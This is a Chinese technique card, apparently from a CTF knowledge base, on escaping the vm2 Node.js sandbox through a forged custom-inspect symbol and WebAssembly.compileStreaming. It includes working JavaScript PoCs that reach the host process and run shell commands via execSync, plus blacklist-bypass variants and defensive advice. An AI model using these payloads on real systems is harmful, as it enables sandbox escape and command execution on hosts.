---
id: binary-pwn-sandbox-escape-vm2-custominspect-symbol-wasm-compilestreaming
title: vm2 逃逸：伪造 nodejs.util.inspect.custom 让宿主 inspect 走到 guest 函数，再用 WebAssembly.compileStreaming 触发 getter 取回 host process
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: vm2-custom-inspect-symbol-wasm-compilestreaming-escape
aliases:
- vm2 compileStreaming 逃逸
- Symbol.for nodejs.util.inspect.custom
- WebAssembly.compileStreaming getter 逃逸
- vm2 customInspect 逃逸
- 数组参数绕过字符黑名单
tags:
- nodejs
- vm2
- sandbox-escape
- symbol
- inspect
- webassembly
- rce
- ctf
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:54:03+08:00'
  notes: 已对照原文核对；本次核对未读取图片；escapeSandbox_PLUS 用 vm2 的 VM（sandbox 内 require/setTimeout 置 undefined）、字符替换过滤与 login 判断（ſyclover/J1rrY）与卡内描述一致；已修正原稿把 noSandbox（裸 vm + 正则黑名单）载荷误标为 vm2 阶段的问题，并在卡内区分两个阶段的过滤器；vm2 逃逸载荷 Symbol.for(nodejs.util.inspect.custom) + WebAssembly.compileStreaming + 数组参数绕过逐字符替换均取自正文；PoC 未对真实目标执行
---

## 一句话结论

当代码在 `vm2` 的 `VM` 里执行、但外层只做“字符黑名单”过滤时，可以把 escape 载荷写成一个**对象字面量**：用全局注册符号 `Symbol.for('nodejs.util.inspect.custom')` 定义 inspection 钩子，再调用 `WebAssembly.compileStreaming(obj)`。宿主侧的 `WebAssembly.compileStreaming` 会先 inspect 入参（触发钩子，钩子在宿主调用栈里拿到 `inspect` 函数），同时还会读取入参的 `then`/`valueOf` 等属性——这些都由宿主 realm 发起、guest 代码执行，于是 `inspect.constructor('return process')()` 拿到宿主 `process`，`mainModule.require('child_process').execSync()` 即逃逸成功。整个载荷不含被过滤的 `'`、`"`、`+`、`\`、`[`、`]` 等字符，用模板字符串拼接标识符即可通过黑名单。

## 原理

- **vm2 的边界是“隐式调用”**：`VM.run()` 只保证 guest 代码不能直接拿到宿主对象；但宿主代码对 guest 对象做的任何 inspect、类型转换、thenable 处理，都会在宿主 realm 中执行 guest 提供的函数。本卡用的是两条并存的隐式路径：
  1. **自定义 inspection**：Node 的 `util.inspect` 会检查对象是否带 `Symbol.for('nodejs.util.inspect.custom')` 方法，带则调用它，并把一个 `inspect` 函数作为第三个参数传入。`Symbol.for` 是全局注册表，跨 realm 相等，所以 guest 能伪造这个符号键。
  2. **thenable/属性读取**：`WebAssembly.compileStreaming(source)` 会对 `source` 做 Promise/属性访问（读 `then`、`valueOf`、`constructor` 等），这些读取会触发 guest 定义的 getter 或方法，同样在宿主调用栈上执行。
- **为什么 `constructor.constructor` 能拿到 process**：钩子收到的 `inspect` 是**宿主 realm 的函数**，`inspect.constructor` 是宿主 `Function`，`Function('return process')()` 就能返回宿主 `process`；这一步不依赖 `process` 字面量，所以黑名单里禁 `process` 也没用。
- **为什么用 `WebAssembly.compileStreaming`**：`vm2` 显式拦截了不少 `WebAssembly`/`Promise` 组合的旧 CVE 路径，但 `compileStreaming` 的参数处理会先访问对象属性再判定 Streaming 接口，属于“先 inspect 后校验”，给了 guest 在宿主侧执行代码的窗口；且失败只产生一个 rejected Promise（本卡用 `.catch(()=>{})` 吞掉）。
- **字符黑名单的绕过靠模板字符串**：`${`${`functio`}n`}` 在求值后拼出 `function`，`${`${`return proc`}ess`}` 拼出 `return process`，都不出现被过滤的标识符原文；用 `Reflect.get(obj, 'execSync')` 取方法可以避免 `[...]` 与 `.execSync` 字面量。

## 触发条件

- 目标是 `vm2` 的 `VM`（不是裸 `vm`），版本未修复跨 realm 隐式调用系列问题（3.9.x 及更早；`compileStreaming`/custom inspect 路径在 3.9.19 前后仍被陆续修补）。
- 外层过滤为字符串/正则黑名单（本卡环境禁 `'`、`"`、`+`、`\` 与 `[`/`]`），不做 AST 白名单、不冻结 guest 可见对象。
- guest 代码能创建对象字面量、能访问 `Symbol.for`、`WebAssembly`、`Reflect`（vm2 默认允许）。
- 目标进程存在 `child_process`（Node 服务端默认满足），且逃逸后需要把结果外带（无回显时写到 Web 可访问目录）。

## 利用步骤

1. 确认沙箱是 `vm2` 且过滤只针对字符（先提交 `1+1`、`Symbol`、`Reflect`、`WebAssembly` 观察是否可访问，被过滤的字符逐个探测）。
2. 构造对象字面量：以 `Symbol.for('nodejs.util.inspect.custom')` 为计算属性名，值是箭头/普通函数，函数体内用模板字符串拼出 `return process` 与 `function`。
3. 在钩子内取 `arguments.callee.caller`（或直接用传入的 `inspect` 参数）拿到宿主函数，`constructor.constructor` 造 `Function` 取 `process`。
4. 用 `process.mainModule.require('child_process')` 取模块，再 `Reflect.get(mod, 'execSync')(cmd)` 执行命令。
5. 以 `WebAssembly.compileStreaming(obj).catch(()=>{})` 作为触发点提交；命令输出写到 Web 目录（如 `cat /f* > /app/public/a.txt`）再访问取回。
6. 若黑名单额外过滤 `Reflect`/`Symbol`，改用 `globalThis` 上的等价引用或 `Object.getOwnPropertyDescriptor` 取值。

## PoC

```javascript
// 过滤了 ' " + \ [ ]，用模板字符串拼标识符；无回显时把结果写进 Web 目录
throw new Proxy({}, {
  get: function () {
    const cc = arguments.callee.caller;
    const p = (cc.constructor.constructor(`${`${`return proc`}ess`}`))();
    const chi = p.mainModule.require(`${`${`child_proces`}s`}`);
    const res = Reflect.get(chi, `${`${`exe`}cSync`}`)(`cat /f* > /app/public/a.txt`);
    return res.toString();
  }
})
```

```javascript
// 另一条同类路径：伪造 inspect 钩子 + compileStreaming 触发（原文最终采用的写法）
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

obj = {
  [customInspectSymbol]: (depth, opt, inspect) => {
    inspect.constructor('return process')().mainModule
      .require('child_process').execSync('cat /f* > /app/public/a.txt');
  },
  valueOf: undefined,
  constructor: undefined,
}

WebAssembly.compileStreaming(obj).catch(()=>{});
```

```text
# 无回显的取回
GET /a.txt   ->  文件内容（本题 flag 在 /flag，容器为 node:18-alpine，很多命令缺失，故用 cat 重定向）
```

说明：PoC 按原文源码与 exp 整理，未在本机运行；`execSync` 的引号在真实过滤环境下需改写为模板字符串或 `String.fromCharCode` 拼接。

## 变体与关联

- **触发点变体**：`WebAssembly.compile`/`instantiate`、`Promise.resolve(thenable)`、`util.inspect`/`console.log` 直接打印、`JSON.stringify(obj)`（调 `toJSON`）、`Symbol.toPrimitive`/`valueOf`/`toString`。
- **取 process 变体**：`arguments.callee.caller.constructor('return process')()`、`Error.prepareStackTrace` 的 CallSite 取 `getThis`/`getFunction`、`inspect.constructor`。
- **过滤绕过变体**：模板字符串拼标识符、`String.fromCharCode`、`'Process'.toLowerCase()`、`Reflect.get`+`Reflect.ownKeys`（见关联卡）、Unicode 转义 `\u0070rocess`（若过滤不处理转义）。
- **关联**：`binary-pwn-sandbox-escape-vm2-cross-realm-implicit-call`（本卡所属的机制总览，含 util.inspect 与 Promise 的抽象分析）、`binary-pwn-sandbox-escape-nodejs-vm-object-create-null-callee-caller`（`arguments.callee.caller` 原语）、`binary-pwn-sandbox-escape-nodejs-vm-waf-reflect-ownkeys-bypass`（同族过滤绕过，但 sink 是 `Reflect.ownKeys` 而非 inspect/compileStreaming）。
- **边界**：vm2 升级到修复版、或宿主对传入 `vm.run` 的对象做深冻结/克隆（不让 guest 定义符号方法）时失效；只过滤字符但对 AST 做白名单（禁止 `Symbol`/`WebAssembly`）时需换触发点；纯 `vm` 沙箱（无 vm2）的逃逸面不同。

## 检测与防御

- **不要用 vm2 跑不可信代码**：vm2 已被官方标记停止维护，改用独立进程 + seccomp/容器隔离（`isolated-vm`、`vm` + `--experimental-permission`、child process）。
- **过滤要基于 AST**：禁止 `Symbol`、`Symbol.for`、`WebAssembly`、`Reflect`、`Proxy`、`arguments.callee`、模板字符串计算属性等节点，而不是字符黑名单。
- **不要 inspect 不可信对象**：日志里打印 guest 对象前先深拷贝为纯数据（`JSON.parse(JSON.stringify(...))` 也可能触发 `toJSON`，需用白名单字段构造）；避免在宿主侧对 guest 对象做 `String()`/`util.inspect`。
- **纵深**：沙箱进程降权、只读挂载、无网络；`child_process` 不可用时逃逸收益降低；对 `mainModule.require('child_process')` 做运行时监控。
- **检测**：提交代码中出现 `Symbol.for`、`nodejs.util.inspect.custom`、`compileStreaming`、`arguments.callee`、`Reflect.get`、模板字符串嵌套（`${`${`）等特征；Node 进程异常 `execSync` 子进程（`cat`/`sh`/`curl`）；Web 可写目录出现新的结果文件。
